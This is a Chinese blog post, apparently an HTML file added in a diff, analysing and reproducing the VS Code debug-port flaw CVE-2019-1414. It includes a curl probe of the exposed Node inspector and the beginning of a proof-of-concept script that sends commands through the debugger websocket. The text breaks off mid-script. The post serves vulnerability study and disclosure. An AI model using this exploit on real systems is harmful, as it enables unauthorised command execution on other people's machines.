@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#"><meta name="theme-color" content="#fff" />
+        <script>
+            const theme = localStorage.getItem('theme');
+            if (theme === "dark") {
+                document.documentElement.setAttribute('data-theme', 'dark');
+                document.querySelector('meta[name="theme-color"]').setAttribute('content', '#1c1c21');
+            } else if (theme === "light") {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff');
+            }
+        </script>
+
+    <meta charset="UTF-8" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    
+    <meta name="renderer" content="webkit" />
+
+    <meta name="generator" content="Hugo 0.59.1" />
+
+    <title>Visual Studio Code本地代码执行漏洞 | b1tg的blog</title>
+
+    <link rel="stylesheet" href="/css/meme.min.75e16b0aedf09e333c293fa9bee0d33343ea30e484f89a1cb6061cdd57594bf3.css" integrity="sha256-deFrCu3wnjM8KT+pvuDTM0PqMOSE+JoctgYc3VdZS/M=" data-instant-track /><style data-instant-track>.post p {text-align:justify;text-justify:distribute}</style>
+
+    <link href="https://fonts.googleapis.com/css?family=EB+Garamond:400,400i,500,700,700i|Noto+Serif+SC:400,500,700|Source+Code+Pro:400,400i,700,700i&display=swap&subset=chinese-simplified" rel="stylesheet" />
+
+    <meta name="author" content="b1tg" />
+    <meta name="description" content="CVE-2019-1414漏洞复现与分析" />
+    <meta name="keywords" content="漏洞分析" />
+    
+    <link rel="shortcut icon" type="image/ico" href="/favicon.ico" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#2a6df4" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="b1tg的blog" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="b1tg的blog" />
+    <meta name="msapplication-starturl" content="../../" />
+    <meta name="msapplication-TileColor" content="#fff" />
+    <meta name="msapplication-TileImage" content="../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+    
+    
+
+    
+    <link rel="canonical" href="https://b1tg.github.io/posts/vscode-local-execute/" />
+
+
+
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2019-11-05T12:54:02+08:00",
+        "dateModified": "2019-11-16T20:28:19+08:00",
+        "url": "https://b1tg.github.io/posts/vscode-local-execute/",
+        "headline": "Visual Studio Code本地代码执行漏洞",
+        "description": "CVE-2019-1414漏洞复现与分析",
+        "keywords": "漏洞分析",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  2365 ,
+        "image": ["https://b1tg.github.io/img/vscode-local-execute/image-20191105125403677.png","https://b1tg.github.io/img/vscode-local-execute/image-20191105132516575.png","https://b1tg.github.io/img/vscode-local-execute/image-20191105132915626.png","https://b1tg.github.io/img/vscode-local-execute/image-20191105135602718.png","https://b1tg.github.io/img/vscode-local-execute/image-20191105135720029.png","https://b1tg.github.io/img/vscode-local-execute/image-20191105140552406.png","https://b1tg.github.io/img/vscode-local-execute/image-20191105141538183.png"],
+        "author": {
+            "@type": "Person",
+            "description": ".",
+            "image": "https://b1tg.github.io/icons/apple-touch-icon.png",
+            "url": "https://b1tg.github.io",
+            "name": "b1tg"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "b1tg的blog",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://b1tg.github.io/icons/apple-touch-icon.png"
+            },
+            "url": "https://b1tg.github.io/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://b1tg.github.io/"
+        }
+    }
+</script>
+
+    
+
+
+
+<meta name="twitter:card" content="summary_large_image" />
+
+
+<meta name="twitter:site" content="@b1tg" />
+
+    
+
+
+
+
+
+
+<meta property="og:title" content="Visual Studio Code本地代码执行漏洞" />
+<meta property="og:description" content="CVE-2019-1414漏洞复现与分析" />
+<meta property="og:url" content="https://b1tg.github.io/posts/vscode-local-execute/" />
+<meta property="og:site_name" content="b1tg的blog" />
+<meta property="og:locale" content="zh-CN" /><meta property="og:image" content="https://b1tg.github.io/img/vscode-local-execute/image-20191105125403677.png" />
+<meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2019-11-05T12:54:02+08:00" />
+    <meta property="article:modified_time" content="2019-11-16T20:28:19+08:00" />
+    
+    <meta property="article:section" content="posts" />
+    <meta property="article:tag" content="漏洞分析" />
+
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        <div class="site-brand">
+            
+            <a href="/" class="brand">b1tg的blog</a>
+            
+        </div>
+    </header>
+
+            
+    <nav class="nav">
+        <ul class="menu" id="menu">
+            
+                
+            
+            
+            
+                <li class="menu-item"><a href="/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon menu-item-icon"><path d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"/></svg><span class="menu-item-name">首页</span></a>
+                </li>
+            
+                <li class="menu-item"><a href="/posts/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon menu-item-icon"><path d="M32 448c0 17.7 14.3 32 32 32h384c17.7 0 32-14.3 32-32V160H32v288zm160-212c0-6.6 5.4-12 12-12h104c6.6 0 12 5.4 12 12v8c0 6.6-5.4 12-12 12H204c-6.6 0-12-5.4-12-12v-8zM480 32H32C14.3 32 0 46.3 0 64v48c0 8.8 7.2 16 16 16h480c8.8 0 16-7.2 16-16V64c0-17.7-14.3-32-32-32z"/></svg><span class="menu-item-name">文章</span></a>
+                </li>
+            
+                <li class="menu-item"><a href="/tags/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" class="icon menu-item-icon"><path d="M497.941 225.941L286.059 14.059A48 48 0 0 0 252.118 0H48C21.49 0 0 21.49 0 48v204.118a48 48 0 0 0 14.059 33.941l211.882 211.882c18.744 18.745 49.136 18.746 67.882 0l204.118-204.118c18.745-18.745 18.745-49.137 0-67.882zM112 160c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm513.941 133.823L421.823 497.941c-18.745 18.745-49.137 18.745-67.882 0l-.36-.36L527.64 323.522c16.999-16.999 26.36-39.6 26.36-63.64s-9.362-46.641-26.36-63.64L331.397 0h48.721a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882z"/></svg><span class="menu-item-name">标签</span></a>
+                </li>
+            
+                <li class="menu-item"><a href="/about/"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" class="icon menu-item-icon"><path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 96c48.6 0 88 39.4 88 88s-39.4 88-88 88-88-39.4-88-88 39.4-88 88-88zm0 344c-58.7 0-111.3-26.6-146.5-68.2 18.8-35.4 55.6-59.8 98.5-59.8 2.4 0 4.8.4 7.1 1.1 13 4.2 26.6 6.9 40.9 6.9 14.3 0 28-2.7 40.9-6.9 2.3-.7 4.7-1.1 7.1-1.1 42.9 0 79.7 24.4 98.5 59.8C359.3 421.4 306.7 448 248 448z"/></svg><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        </ul>
+    </nav>
+
+            
+            
+    
+        
+            
+        
+        
+        <div id="theme-toggle" onclick="modeSwitcher()">🌞</div>
+    
+
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+        <article class="content post">
+            
+            <h1 class="post-title">Visual Studio Code本地代码执行漏洞</h1>
+
+            
+
+            
+                
+            
+
+            
+                <div class="post-meta">
+    
+        
+        <time datetime="2019-11-05T12:54:02+08:00" class="post-meta-item published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M148 288h-40c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3 0 6-2.7 6-6z"/></svg>2019.11.5</time>
+    
+    
+        
+        <time datetime="2019-11-16T20:28:19+08:00" class="post-meta-item modified"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>2019.11.16</time>
+    
+    
+    
+        
+        
+        
+            
+        
+    
+    
+        
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>2365</span>
+    
+    
+        
+        <span class="post-meta-item readingtime"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>5&nbsp;分钟</span>
+    
+</div>
+            
+
+            <div class="post-body">
+
+<h1 id="背景"><a href="#背景" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>背景</h1>
+
+<p>​微软在2015年推出的跨平台开源编辑器Visual Studio Code（VS Code），凭借其开箱即用的便捷以及丰富的插件社区，迅速吸引了大批用户。在最新的PYPL IDE排行榜中，VS Code已位列第六，并且仍处于上升趋势。</p>
+
+<p>​几个月前，国外安全研究员<a href="https://twitter.com/taviso" target="_blank">Tavis Ormandy</a>发现并提交了VS Code中的一个本地命令执行漏洞(CVE-2019-1414)，并于最近披露。1.39之前版本的vscode受此漏洞影响。</p>
+
+<h1 id="漏洞分析与复现"><a href="#漏洞分析与复现" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>漏洞分析与复现</h1>
+
+<p>可以在<a href="https://code.visualstudio.com/updates/v1_38" target="_blank">这里</a>找到老版本的vscode安装包，各个操作系统版本的都有，我们这里使用1.38 Mac版本进行演示。</p>
+
+<p>打开下载的vscode。通过ps可以看到，vscode默认开启了一个nodejs调试端口(<code>--inspect=13611</code>)。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ ps aux <span class="p">|</span>grep inspect
+ch               <span class="m">95536</span>   <span class="m">0</span>.0  <span class="m">0</span>.7  <span class="m">4815292</span>  <span class="m">56884</span>   ??  S     <span class="m">9</span>:59上午   <span class="m">0</span>:03.49 /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper --nolazy --inspect<span class="o">=</span><span class="m">13611</span> /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Resources/app/out/bootstrap-fork --type<span class="o">=</span>extensionHost
+ch               <span class="m">95748</span>   <span class="m">0</span>.0  <span class="m">0</span>.0  <span class="m">4286472</span>    <span class="m">840</span> s003  S+   <span class="m">10</span>:42上午   <span class="m">0</span>:00.01 grep --color<span class="o">=</span>auto --exclude-dir<span class="o">=</span>.bzr --exclude-dir<span class="o">=</span>CVS --exclude-dir<span class="o">=</span>.git --exclude-dir<span class="o">=</span>.hg --exclude-dir<span class="o">=</span>.svn inspect</code></pre></td></tr></table>
+</div>
+</div>
+<p>我们可以通过api查看以下信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ curl http://127.0.0.1:13611/json
+<span class="o">[</span> <span class="o">{</span>
+  <span class="s2">&#34;description&#34;</span>: <span class="s2">&#34;node.js instance&#34;</span>,
+  <span class="s2">&#34;devtoolsFrontendUrl&#34;</span>: <span class="s2">&#34;chrome-devtools://devtools/bundled/js_app.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
+  <span class="s2">&#34;devtoolsFrontendUrlCompat&#34;</span>: <span class="s2">&#34;chrome-devtools://devtools/bundled/inspector.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
+  <span class="s2">&#34;faviconUrl&#34;</span>: <span class="s2">&#34;https://nodejs.org/static/favicon.ico&#34;</span>,
+  <span class="s2">&#34;id&#34;</span>: <span class="s2">&#34;09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
+  <span class="s2">&#34;title&#34;</span>: <span class="s2">&#34;/private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper[95536]&#34;</span>,
+  <span class="s2">&#34;type&#34;</span>: <span class="s2">&#34;node&#34;</span>,
+  <span class="s2">&#34;url&#34;</span>: <span class="s2">&#34;file://&#34;</span>,
+  <span class="s2">&#34;webSocketDebuggerUrl&#34;</span>: <span class="s2">&#34;ws://127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>
+<span class="o">}</span> <span class="o">]</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>在chrome中直接打开这里<code>devtoolsFrontendUrl</code>指向的链接，就可以得到一个调试终端，可以在里面执行js指令。</p>
+
+<p><img src="/img/vscode-local-execute/image-20191105125403677.png" alt="image-20191105125403677" /></p>
+
+<p>漏洞作者给出的poc如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="c1">//poc.js
+</span><span class="c1"></span><span class="kr">const</span> <span class="nx">fetch</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-fetch&#39;</span><span class="p">)</span>
+<span class="kr">const</span> <span class="nx">WebSocket</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;ws&#39;</span><span class="p">)</span>
+
+<span class="kd">function</span> <span class="nx">die</span> <span class="p">(</span><span class="nx">reason</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">reason</span><span class="p">)</span>
+  <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">.</span><span class="nx">length</span> <span class="o">!==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">die</span><span class="p">(</span><span class="s1">&#39;usage: node index.js &lt;IP&gt; &lt;PORT&gt; &lt;COMMAND&gt;&#39;</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="kr">const</span> <span class="nx">IP</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+<span class="kr">const</span> <span class="nx">COMMAND</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+<span class="kr">const</span> <span class="nx">COMMAND_B64</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">COMMAND</span><span class="p">)</span>
+
+<span class="kd">function</span> <span class="nx">base64</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="nx">async</span> <span class="kd">function</span> <span class="nx">getWsLink</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
+  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">()</span>
+  <span class="k">return</span> <span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">webSocketDebuggerUrl</span>
+<span class="p">}</span>
+
+<span class="nx">async</span> <span class="kd">function</span> <span class="nx">main</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[?] Getting webSocketDebuggerUrl from http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
+  <span class="kr">const</span> <span class="nx">wsLink</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">getWsLink</span><span class="p">().</span><span class="k">catch</span><span class="p">(</span><span class="nx">die</span><span class="p">)</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[!] Found webSocketDebuggerUrl: </span><span class="si">${</span><span class="nx">wsLink</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+  <span class="kr">const</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">wsLink</span><span class="p">)</span>
+
+  <span class="nx">socket</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="nx">async</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[?] Connection established to </span><span class="si">${</span><span class="nx">wsLink</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.enable&#39;</span> <span class="p">}))</span>
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+      <span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
+      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
